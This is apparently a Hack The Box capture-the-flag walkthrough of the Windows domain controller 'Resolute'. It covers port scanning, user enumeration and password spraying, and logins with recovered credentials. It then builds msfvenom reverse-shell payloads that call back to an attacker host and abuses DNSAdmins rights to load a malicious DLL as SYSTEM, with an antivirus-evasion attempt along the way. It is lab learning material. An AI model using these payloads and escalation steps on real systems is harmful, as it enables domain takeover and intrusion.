# Resolute
IP: 10.10.10.169
## You know the drill..
Standard initial recon via nMap, discovered many open ports:
```console
root@kali:~# nmap -sV -p1-65535 10.10.10.169                                                                                                                                                                       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-30 18:13 EST                                                                                                                                                    
Nmap scan report for 10.10.10.169                                                                                                               PORT      STATE SERVICE      VERSION                                                                                                            
53/tcp    open  domain?
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-30 23:20:42Z)                                             
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49910/tcp open  msrpc        Microsoft Windows RPC
61911/tcp open  unknown
```

LDAP is open, so enum4Linux is able to query the LDAP port. 

enum4linux returns some server logs, I see that the default password for marko is Welcome123! 
```
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
```
I attempt to login to marko's account - but he has changed his password, but maybe someone else hasn't?
Using the results from enum4linux im able to grab a list of users - so I wrote a quick srcipt to attempt to login via WinRM using Evil-WinRM.

## Always count on laziness
I can login to melanie's account!
```console
evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
```
I grab the user flag then look around, I can't see anything useful - after a lot (like a lot) of careful enumeration, I find credentials for ryan:

> Serv3r4Admin4cc123!

## Ryan
I login to ryan's account:
```console
evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
```
I look around for a bit then try to get a meterpreter shell, I compile a .exe payload with msfvenom, however, windows defender catches it. 

Hmm, what can I do?

## Antivirus evasion

To evade the AV, I compile a non-staged msfvenom payload - but I need to know the arcitecture.
```
PS C:\Users\ryan\Documents> [IntPtr]::Size
8
```
8 means 64 bit.
So I complile a x64 payload:
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.**.** LPORT=4444 --platform=windows -f exe > shell.exe
```
Defender still catches it.

## This is getting kinda hard.
I run:
C:\> whoami /groups

I can see ryan is part of DNSAdmin - an attack vector!
DNSAdmin's are able to add DLL plugins to the DNS server.

But I still have to sneak the payload past windows defender.

I looking back over the nMap results - I spot the SMB port, google tells me AV's don't scan arrivals via SMB. (for some reason?)

## Preparation
Impacket is a python networking tool which allows me to serve files to SMB.

I complile a payload as .dll by running:

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.**.** LPORT=4444 --platform=windows -f dll > plugin.dll
```

Start a SMB server with Impacket:
```console
$ python3 smbserver.py share ~/tools/plugin.dll
```
Listen with metasploit:
```
msf5 > use exploit/windows/x64/shell_reverse_tcp
msf5 > use multi/handler
msf5 exploit(multi/handler) > run
```
## Exploitation
To hook it to the DNS server I need to figure out the FQDN, I can use ping:
```
C:\> ping -a 10.10.10.169
Pinging Resolute.megabank.local [10.10.10.169] with 32 bytes of data:                                  
Reply from 10.10.10.169: bytes=32 time<1ms TTL=128                                                     
```
The FQDN is 'Resolute.megabank.local'.

Now to hook the DLL:
```
C\:>dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.**.**\tools\plugin.dll
```
With the impacket SMB server running and meterpreter listening, I consecutivly run:
```
C:/> sc.exe stop dns
C:/> sc.exe start dns
```
## Rooted!

I got SYSTEM!
```
msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.68:443 
[*] Command shell session 2 opened (10.10.14.68:443 -> 10.10.10.169:50131)

C:\ >whoami
nt authority\system
```
Grab the root flag:
```
C:\>type \Users\Administrator\Desktop\root.txt

e1d94876a506850d0c20edb5405e619c
```
And I'm done!

This was one of the most interesting machines I've cracked - I ended up learning a lot.

### Thanks for reading!
